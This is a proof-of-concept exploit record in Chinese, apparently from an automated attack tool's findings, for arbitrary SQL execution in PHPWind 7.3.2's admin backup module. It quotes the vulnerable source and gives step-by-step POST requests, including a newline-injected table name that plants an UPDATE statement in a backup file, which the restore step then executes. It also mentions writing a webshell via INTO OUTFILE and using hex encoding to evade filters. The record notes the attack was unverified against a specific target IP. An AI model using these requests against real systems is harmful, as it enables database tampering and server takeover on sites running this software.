# PHPWind 7.3.2 admin/bakup.php 任意 SQL 执行（bakindata 多语句 + bakuptable 表名注入）

- **code**: phpwind-7.3.2-admin-bakup.php-任意-sql-执行-bakindata-多语句-bakuptable-表名注入
- **kind**: poc
- **category**: sqli
- **component**: PHPWind
- **versions**: 7.3.2（7.5 SP3 同结构）
- **severity**: critical
- **language**: php
- **source**: manual
- **verified_note**: 未在真实目标上验证：本靶标（203.0.113.126 上三套 PHPWind 7.3.2）实测 `adminjob=bakup`、`adminjob=bakup&admintype=bakout`、`adminjob=bakup&admintype=bakin` 全部返回 148xx「您没有权限进行此项操作或此功能未完成」⇒ 权限键 bakout/bakin 均未开放，仅完成源码级判据确认。
- **path**: pocs/phpwind-7.3.2-admin-bakup.php-任意-sql-执行-bakindata-多语句-bakuptable-表名注入/phpwind-bakup-arbitrary-sql.txt
- **tags**: phpwind,bakup,任意SQL,多语句,备份恢复,权限绕过判据
- **created_at**: 2026-10-06T23:17:34.829Z
- **found_by**: exploit

## 描述

前置：`$rightset['bakup']==1`（注意权限键判定：`example.com:57` 走 `adminRight('bakup',$admintype)`，`$temp = $admintype ?: $adminjob` ⇒ 实际检查的是 `bakout`/`bakin` 而非 `bakup`；实测两套部署 `bakout`/`bakin` 均 DENY）。
原理：① `admin/bakup.php:185-216` 的 `bakindata($filename)` 用 `file($filename)` 按行读，**每遇到以 `;` 结尾的行就 `$db->query($query)` 执行一次** ⇒ 天然支持多语句（不依赖 MySQL 的多语句能力）。② 同文件 `bakuptable()` 第 177 行 `$creattable .= "DROP TABLE IF EXISTS $table;\n"`，`$table` 直接取自 `$_POST['tabledb']` 数组元素，**无任何过滤**，元素里含 `\n` 即可在导出文件里插入一条独立 SQL 行。③ `$pre` 完全由请求参数控制（`InitGP(array('step','count','pre'))`），决定导出文件名 `data/<pre><f_num>.sql` 与恢复读取的 `data/<pre><step>.sql`，两者可对齐。
⇒ 组合：用 `bakout` 写一个含恶意行的 `.sql`，再用 `bakin` 执行 ⇒ 任意 SQL（含 `UPDATE pw_hack`、`INTO OUTFILE` 写马）。
实测状态：本靶标两套部署 `adminjob=bakup`（不带 admintype）/`bakup&admintype=bakin` 均返回 148xx「您没有权限进行此项操作或此功能未完成」⇒ 未验证，仅记录判据备用。

## 用法

```
1) 先确认权限：GET /bbs/example.com?adminjob=bakup 与 ?adminjob=bakup&admintype=bakin —— 返回 148xx「您没有权限」即不可用。
2) 可用时：POST ?adminjob=bakup&verify=<该页 verify>，body `action=bakout&step=0&sizelimit=1&tabledb[]=<注入串>&tabledb[]=pw_config`，注入串形如 `x\nUPDATE pw_hack SET hk_value=0 WHERE hk_name=0x626b5f706572;`（`\n` 需真实换行，URL 编码为 %0A）。
3) 从响应/重定向 URL 中取出服务端生成的 `pre=` 值。
4) POST ?adminjob=bakup&verify=<v>，body `action=bakin&step=1&count=1&pre=<pre>` ⇒ 执行。
5) 验证：目标业务页出现 payload 执行效果。
判据：bakindata 每行以 `;` 结尾即执行 ⇒ 天然多语句，无需 MySQL multi_query。
```

## 正文

```
// admin/bakup.php:174-183 —— 表名裸拼接（$table 来自 $_POST['tabledb']）
function bakuptable($tabledb){
	global $db;
	foreach($tabledb as $key=>$table){
		$creattable.= "DROP TABLE IF EXISTS $table;\n";          // ★ $table 可控，含 \n 即插入独立 SQL 行
		$CreatTable = $db->get_one("SHOW CREATE TABLE $table");
		$CreatTable['Create Table']=str_replace($CreatTable['Table'],$table,$CreatTable['Create Table']);
		$creattable.=$CreatTable['Create Table'].";\n\n";
	}
	return $creattable;
}

// admin/bakup.php:185-216 —— 按行执行，每行以 ; 结尾即 query 一次（多语句）
function bakindata($filename) {
	global $db,$charset;
	$sql=file($filename);
	$query='';
	foreach($sql as $key => $value){
		$value=trim($value);
		if(!$value || $value[0]=='#') continue;
		if(eregi("\;$",$value)){                                  // ★ 行尾 ;
			$query.=$value;
			if(eregi("^CREATE",$query)){ /* ...重建表结构... */ }
			elseif(eregi("^INSERT",$query)){ $query='REPLACE '.substr($query,6); }
			$db->query($query);                                   // ★ 执行
			$query='';
		} else { $query.=$value; }
	}
}

// admin/bakup.php:8-14, 50-64 —— bakout 分支：$pre 可控，写 data/<pre><f_num>.sql
// admin/bakup.php:90-115 —— bakin 分支：bakindata(D_P.'data/'.$pre.$step.'.sql'); 执行后 updatecache();

// ---- 利用步骤（前置：$rightset['bakout'] 与 $rightset['bakin'] 均为 1）----
// 1) POST /bbs/example.com?adminjob=bakup&verify=<v>   （注意：不带 admintype ⇒ 检查键为 bakup；带 admintype=bakout 则检查 bakout）
//    body: action=bakout&step=0&sizelimit=1&tabledb[]=x%0AUPDATE+pw_hack+SET+hk_value=0+WHERE+hk_name=0x626b5f706572;&tabledb[]=pw_config
//    （tabledb 元素含换行 ⇒ 导出文件里出现独立一行 `UPDATE pw_hack SET hk_value=0 WHERE hk_name=0x626b5f706572;;`）
//    ⇒ 响应里会带出服务端生成的 $pre（$stop=1 分支 adminmsg('bakup_step', EncodeUrl($j_url)) 含 pre=）
// 2) POST /bbs/example.com?adminjob=bakup&verify=<v> body: action=bakin&step=1&count=1&pre=<上一步的 pre>
//    ⇒ bakindata 执行 data/<pre>1.sql ⇒ 任意 SQL 生效
// 3) 回到目标业务页触发（例：PHPWind 银行插件 POST /bbs/example.com?H_name=bank 带 1=<payload>）
// 注意：$table 里不要用引号（CheckVar 可能过滤），表名用 0x... 十六进制表达；bk_per 的 hex 为 0x626b5f706572

```
